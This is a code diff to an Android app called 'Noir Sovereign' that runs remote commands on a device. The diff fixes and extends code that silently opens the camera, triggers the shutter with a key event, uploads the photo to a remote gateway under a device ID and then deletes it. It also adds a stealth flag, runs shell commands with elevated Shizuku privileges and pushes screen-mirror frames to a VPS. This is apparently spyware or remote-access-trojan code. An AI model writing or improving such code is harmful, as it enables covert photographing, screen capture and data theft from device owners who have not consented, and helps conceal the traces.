@@ -422,6 +422,11 @@ class SovereignApp(App):
         self.title = f"Noir Sovereign v{self.version}"
         self._mirror_active = False
         self._log_visible = True
+        self.is_stealth = False  # BUG-FIX: Initialize to prevent AttributeError on overlay
+        self.overlay_active = False
+        self.shizuku_status = "STANDARD"
+        self.shizuku_binary = "sh"
+        self._poll_backoff = 0
         
         self.sm = ScreenManager(transition=FadeTransition())
         self.dashboard = DashboardScreen(name='dashboard')
@@ -1051,16 +1056,25 @@ class SovereignApp(App):
 
             elif atype in ("camera_back", "camera_front"):
                 is_front = "front" in atype
-                cam_id = 1 if is_front else 0
-                temp_dir = App.get_running_app().user_data_dir
-                path = os.path.join(temp_dir, f"cam_{atype}_{int(time.time())}.jpg")
+                dcim_path = "/sdcard/DCIM/Camera"
                 try:
-                    self._log(f"[SMC] Attempting Camera Capture (ID: {cam_id})...")
-                    self._run_shell("input keyevent 27")
-                    time.sleep(3.0)
-                    dcim_path = "/sdcard/DCIM/Camera"
-                    res = self._run_shell(f"ls -t {dcim_path} | head -n 1")
-                    if res["success"] and res["output"]:
+                    self._log(f"[SMC] Camera Capture: {'FRONT' if is_front else 'BACK'}...")
+                    # BUG-FIX: KEYCODE_CAMERA (27) is deprecated on modern Android.
+                    # Use intent-based launch + KEYCODE_VOLUME_UP shutter instead.
+                    if is_front:
+                        # Open front camera via intent
+                        self._run_shell("am start -a android.media.action.STILL_IMAGE_CAMERA --ei android.intent.extras.CAMERA_FACING 1")
+                    else:
+                        self._run_shell("am start -a android.media.action.STILL_IMAGE_CAMERA")
+                    time.sleep(2.5)  # Wait for camera app to open
+                    # Trigger shutter with VOLUME_UP (works on most Android camera apps)
+                    self._run_shell("input keyevent 24")  # KEYCODE_VOLUME_UP
+                    time.sleep(2.0)  # Wait for photo to save
+                    # Press back to close camera app
+                    self._run_shell("input keyevent 4")
+                    # Find the latest photo in DCIM
+                    res = self._run_shell(f"ls -t {dcim_path} 2>/dev/null | head -n 1")
+                    if res["success"] and res.get("output", "").strip():
                         target_file = os.path.join(dcim_path, res["output"].strip())
                         with open(target_file, 'rb') as f:
                             r = session.post(
@@ -1072,17 +1086,13 @@ class SovereignApp(App):
                         if r.status_code == 200:
                             key = r.json().get('key', '')
                             result = {"success": True, "output": f"Camera capture uploaded: {key}"}
-                            self._run_shell(f"rm {target_file}")
+                            self._run_shell(f"rm -f '{target_file}'")
                         else:
                             result = {"success": False, "error": f"Upload failed: {r.status_code}"}
                     else:
-                        result = {"success": False, "error": "Could not find captured image in DCIM."}
+                        result = {"success": False, "error": "No image found in DCIM after capture."}
                 except Exception as e:
                     result = {"success": False, "error": f"Camera error: {e}"}
-                finally:
-                    if os.path.exists(path):
-                        try: os.remove(path)
-                        except: pass
 
             elif atype == "audio_record":
                 duration = params.get("duration", 10)
@@ -1292,26 +1302,29 @@ class SovereignApp(App):
         except: pass
 
     def _run_shell(self, cmd, timeout=15):
-        """Tiered Shell Execution: Shizuku -> Standard Sh Fallback."""
+        """Tiered Shell Execution: Shizuku (rish -c) -> Standard Sh Fallback."""
         import subprocess
-        
-        # Test Shizuku Availability
-        shizuku_binary = getattr(self, "shizuku_binary", "shizuku")
+
+        # BUG-FIX: rish uses '-c' flag, NOT 'shell' subcommand.
+        # Wrong: 'rish shell screencap -p /path' 
+        # Correct: 'rish -c screencap -p /path'
         if getattr(self, "shizuku_status", "") == "AUTHORIZED":
-            final_cmd = f"{shizuku_binary} shell {cmd}"
+            shizuku_binary = getattr(self, "shizuku_binary", "rish")
+            # Escape single quotes in command to prevent shell injection issues
+            safe_cmd = cmd.replace("'", "'\"'\"'")
+            final_cmd = f"{shizuku_binary} -c '{safe_cmd}'"
         else:
-            # Fallback to standard app shell
             final_cmd = cmd
 
         try:
             r = subprocess.run(final_cmd, shell=True, capture_output=True, text=True, timeout=timeout)
-            
-            # If Shizuku specifically failed with permission denied, try standard shell
+            # If Shizuku failed with permission denied, fall back to standard shell
             if getattr(self, "shizuku_status", "") == "AUTHORIZED" and r.returncode != 0 and "permission denied" in r.stderr.lower():
-                noir_log("[SMC] Shizuku Permission Denied. Falling back to Standard Sh...", level="WARNING")
+                noir_log("[SMC] Shizuku denied — falling back to standard sh", level="WARNING")
                 r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
-                
             return {"success": r.returncode == 0, "output": (r.stdout + r.stderr).strip()}
+        except subprocess.TimeoutExpired:
+            return {"success": False, "error": f"Command timed out after {timeout}s"}
         except Exception as e:
             return {"success": False, "error": str(e)}
 
@@ -1335,7 +1348,6 @@ class SovereignApp(App):
                             img.save(jpeg_path, "JPEG", quality=40, optimize=True)
                         
                         with open(jpeg_path, 'rb') as f:
-                            # Push directly to screen frame endpoint or as a regular upload
                             r = session.post(
                                 f"{GATEWAY_URL}/agent/upload?device_id={DEVICE_ID}",
                                 headers={"Authorization": f"Bearer {API_KEY}"},
@@ -1344,9 +1356,10 @@ class SovereignApp(App):
                             )
                             if r.status_code == 200:
                                 key = r.json().get('key')
-                                # Notify gateway of latest mirror frame
+                                # BUG-FIX: VPS_IP had no http:// scheme — URL was invalid.
+                                vps_base = VPS_IP if VPS_IP.startswith("http") else f"http://{VPS_IP}"
                                 session.post(
-                                    f"{VPS_IP.replace('http://', 'http://').split(':')[0]}:80/api/screen/frame",
+                                    f"{vps_base}/api/screen/frame",
                                     headers={"Authorization": f"Bearer {API_KEY}"},
                                     json={"key": key, "width": 450, "height": 1000},
                                     timeout=2
